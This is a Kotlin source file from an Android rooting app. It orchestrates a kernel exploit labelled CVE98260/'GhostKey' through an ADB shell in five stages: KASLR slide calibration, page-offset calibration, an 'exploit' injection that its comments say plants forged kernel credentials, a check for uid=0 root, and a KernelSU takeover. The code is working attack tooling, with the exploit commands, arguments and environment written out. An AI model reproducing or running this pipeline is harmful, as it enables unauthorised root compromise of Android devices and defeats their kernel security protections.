package org.supass.ai_su_pass.cve98260

import android.os.SystemClock
import java.util.ArrayDeque
import org.supass.ai_su_pass.core.adb.AdbShellChannel
import org.supass.ai_su_pass.core.bridge.cve98260_native.Cve98260Chunk
import org.supass.ai_su_pass.core.bridge.cve98260_native.Cve98260Request
import org.supass.ai_su_pass.core.bridge.cve98260_native.Cve98260StageEvent
import org.supass.ai_su_pass.core.shell.ShellResult

/** 流水线五个阶段的阶段码，与 Pigeon `events.stage` 逐字一致。 */
internal object Cve98260Stage {
    const val CALIB_A = "calib_a"
    const val CALIB_B = "calib_b"
    const val INJECT = "inject"
    const val VERIFY = "verify"
    const val KSU = "ksu"

    val ORDERED = listOf(CALIB_A, CALIB_B, INJECT, VERIFY, KSU)
}

/** 阶段状态码，与 Pigeon `events.status` 逐字一致。 */
internal object Cve98260Status {
    const val RUNNING = "running"
    const val OK = "ok"
    const val DEGRADED = "degraded"
    const val FAILED = "failed"
    const val SKIPPED = "skipped"
}

private const val CALIB_A_TIMEOUT_MS = 60_000L
private const val CALIB_B_TIMEOUT_MS = 75_000L
private const val INJECT_TIMEOUT_MS = 120_000L
private const val VERIFY_TIMEOUT_MS = 15_000L
private const val KSU_TIMEOUT_MS = 90_000L
private const val CANCEL_TIMEOUT_MS = 10_000L
private const val SETUP_TIMEOUT_MS = 5_000L
private const val READ_TIMEOUT_MS = 5_000L
private const val SOCKET_PROBE_TIMEOUT_MS = 3_000L

private const val EXIT_CALIB_A = 2
private const val EXIT_CALIB_B = 3
private const val EXIT_INJECT = 4
private const val EXIT_VERIFY = 5

private const val WORK_DIR = "/data/local/tmp/cve98260"
private const val KSUD_NAME = "libksud.so"
private const val RESULT_SLIDE = "slide.txt"
private const val RESULT_PAGE_OFFSET = "page_offset.txt"
private const val RESULT_PAGE_OFFSET_SCORE = "page_offset.score"

/**
 * 一次 GhostKey 运行的五阶段编排。
 *
 * 阶段串行、判定只在本类；Dart 只调 `start` / `poll` / `cancel`。
 * 所有命令都经 [channel] 的 raw shell 通道执行，stdin 二进制安全。
 */
internal class Cve98260Session(
    private val request: Cve98260Request,
    private val binPath: String,
    private val profileBlob: ByteArray,
    private val ksudPath: String,
    private val channel: AdbShellChannel,
) {

    val sessionId: String = "cve98260-${System.currentTimeMillis()}"

    private val startedAt: Long = SystemClock.elapsedRealtime()

    private val roundId: Long = System.currentTimeMillis()

    private val socketPath: String = "$WORK_DIR/pc98260-$roundId.sock"

    private val stopFilePath: String = "$WORK_DIR/pc98260-$roundId.stop"

    private val lock = Any()

    private val pendingEvents = ArrayDeque<Cve98260StageEvent>()

    private val logBuffer = StringBuilder()

    @Volatile
    private var finished = false

    @Volatile
    private var exitCode = -1

    @Volatile
    private var timedOut = false

    @Volatile
    private var failure = ""

    @Volatile
    private var cancelled = false

    private var slide = ""

    private var pageOffset = ""

    /** 308 B blob 的短名。 */
    private val blob: ByteArray get() = profileBlob

    fun start() {
        Thread({ runPipeline() }, "cve98260-session").apply {
            isDaemon = true
            start()
        }
    }

    /** 增量取走事件与输出；取走即清空。 */
    fun poll(): Cve98260Chunk = synchronized(lock) {
        val events = ArrayList<Cve98260StageEvent>(pendingEvents)
        pendingEvents.clear()
        val log = logBuffer.toString()
        logBuffer.setLength(0)
        Cve98260Chunk(
            sessionId = sessionId,
            events = events,
            log = log,
            finished = finished,
            exitCode = exitCode.toLong(),
            timedOut = timedOut,
            durationMs = SystemClock.elapsedRealtime() - startedAt,
            failure = failure,
        )
    }

    /**
     * 取消：停止本侧判定并让 rootd 优雅退出。
     *
     * 不对注入进程发任何信号——它们钉住的页里有伪造 cred。
     */
    fun cancel() {
        cancelled = true
        synchronized(lock) {
            timedOut = true
            finished = true
            exitCode = -1
        }
        Thread({
            runCatching { exec(cmd("$binPath rootd-stop"), CANCEL_TIMEOUT_MS, null) }
        }, "cve98260-cancel").apply {
            isDaemon = true
            start()
        }
    }

    private fun runPipeline() {
        try {
            exec("mkdir -p $WORK_DIR", SETUP_TIMEOUT_MS, null)
            var code = runCalibA()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            code = runCalibB()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            code = runInject()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            code = runVerify()
            if (cancelled) return
            if (code != 0) {
                finish(code)
                return
            }
            runKsu()
            finish(0)
        } catch (t: Throwable) {
            synchronized(lock) {
                failure = t.javaClass.simpleName
                exitCode = -1
                finished = true
            }
        }
    }

    private fun runCalibA(): Int {
        emit(Cve98260Stage.CALIB_A, Cve98260Status.RUNNING)
        val r = exec(cmd("$binPath calibrate-a"), CALIB_A_TIMEOUT_MS, blob)
        append(r)
        val text = readText(RESULT_SLIDE)
        if (text.isNullOrEmpty()) {
            emit(Cve98260Stage.CALIB_A, Cve98260Status.FAILED)
            return EXIT_CALIB_A
        }
        slide = text
        emit(Cve98260Stage.CALIB_A, Cve98260Status.OK)
        return 0
    }

    private fun runCalibB(): Int {
        emit(Cve98260Stage.CALIB_B, Cve98260Status.RUNNING)
        val r = exec(
            cmd("$binPath calibrate-b --slide $slide"),
            CALIB_B_TIMEOUT_MS,
            blob,
        )
        append(r)
        val offset = readText(RESULT_PAGE_OFFSET)
        if (offset.isNullOrEmpty()) {
            emit(Cve98260Stage.CALIB_B, Cve98260Status.FAILED)
            return EXIT_CALIB_B
        }
        pageOffset = offset
        val score = readText(RESULT_PAGE_OFFSET_SCORE).orEmpty()
        if (score.contains("fallback", ignoreCase = true)) {
            if (!request.acceptFallbackPageOffset) {
                emit(Cve98260Stage.CALIB_B, Cve98260Status.FAILED)
                return EXIT_CALIB_B
            }
            emit(Cve98260Stage.CALIB_B, Cve98260Status.DEGRADED)
            return 0
        }
        emit(Cve98260Stage.CALIB_B, Cve98260Status.OK)
        return 0
    }

    private fun runInject(): Int {
        emit(Cve98260Stage.INJECT, Cve98260Status.RUNNING)
        val r = exec(
            cmd("$binPath exploit --slide $slide --page-offset $pageOffset --daemon-exit"),
            INJECT_TIMEOUT_MS,
            blob,
        )
        append(r)
        if (r.timedOut) {
            emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
            return EXIT_INJECT
        }
        if (!waitSocket()) {
            emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
            return EXIT_INJECT
        }
        emit(Cve98260Stage.INJECT, Cve98260Status.OK)
        return 0
    }

    private fun runVerify(): Int {
        emit(Cve98260Stage.VERIFY, Cve98260Status.RUNNING)
        val r = exec(cmd("$binPath su -c id"), VERIFY_TIMEOUT_MS, null)
        append(r)
        if (!r.stdout.contains("uid=0")) {
            emit(Cve98260Stage.VERIFY, Cve98260Status.FAILED)
            return EXIT_VERIFY
        }
        emit(Cve98260Stage.VERIFY, Cve98260Status.OK)
        return 0
    }

    /** KSU 接管。只在 verify 成功后被调用；失败不影响会话级退出码。 */
    private fun runKsu(): Int {
        if (!request.runKsu) {
            emit(Cve98260Stage.KSU, Cve98260Status.SKIPPED)
            return 0
        }
        emit(Cve98260Stage.KSU, Cve98260Status.RUNNING)
        if (ksudPath.isEmpty()) {
            synchronized(lock) {
                logBuffer.append("[ksu] bundled ksud missing: ").append(KSUD_NAME).append('\n')
            }
            emit(Cve98260Stage.KSU, Cve98260Status.FAILED)
            return 0
        }
        val r = exec(cmd("$binPath ksu-takeover"), KSU_TIMEOUT_MS, blob)
        append(r)
        emit(
            Cve98260Stage.KSU,
            if (r.exitCode == 0) Cve98260Status.OK else Cve98260Status.FAILED,
        )
        return 0
    }

    /** rootd socket 出现即视为注入完成；最多 15 × 1 s。 */
    private fun waitSocket(): Boolean {
        repeat(15) {
            val r = exec("test -S $socketPath && echo ok", SOCKET_PROBE_TIMEOUT_MS, null)
            if (r.stdout.contains("ok")) return true
            Thread.sleep(1_000L)
        }
        return false
    }

    private fun finish(code: Int) {
        synchronized(lock) {
            if (cancelled) return
            exitCode = code
            finished = true
        }
    }

    private fun emit(stage: String, status: String) {
        if (cancelled) return
        synchronized(lock) {
            pendingEvents.addLast(Cve98260StageEvent(stage = stage, status = status))
        }
    }

    private fun append(r: ShellResult) {
        synchronized(lock) {
            if (r.stdout.isNotEmpty()) logBuffer.append(r.stdout)
            if (r.stderr.isNotEmpty()) logBuffer.append(r.stderr)
        }
    }

    private fun readText(name: String): String? {
        val r = exec("cat $WORK_DIR/$name", READ_TIMEOUT_MS, null)
        val text = r.stdout.trim()
        return text.ifEmpty { null }
    }

    private fun exec(command: String, timeoutMs: Long, stdin: ByteArray?): ShellResult =
        channel.exec(command, timeoutMs, stdin)

    private fun cmd(argv: String): String = envPrefix() + argv

    /** 上游 `baseEnv()` 的 8 项，写成一条 shell 前缀。 */
    private fun envPrefix(): String = buildString {
        append("cd $WORK_DIR && ")
        append("CVE98260_HOME=$WORK_DIR ")
        append("TMPDIR=/data/local/tmp ")
        append("HOME=/data/local/tmp ")
        append("PATH=/sbin:/system/sbin:/system/bin:/system/xbin ")
        append("PLANT_FAST=1 ")
        append("PC98260_SOCK=$socketPath ")
        append("PC98260_STOP_FILE=$stopFilePath ")
        append("CVE98260_SLIDE=$slide ")
        append("CVE98260_KSUD=$ksudPath ")
        append("CVE98260_KSU_LOG=$WORK_DIR/ksud.log ")
    }
}
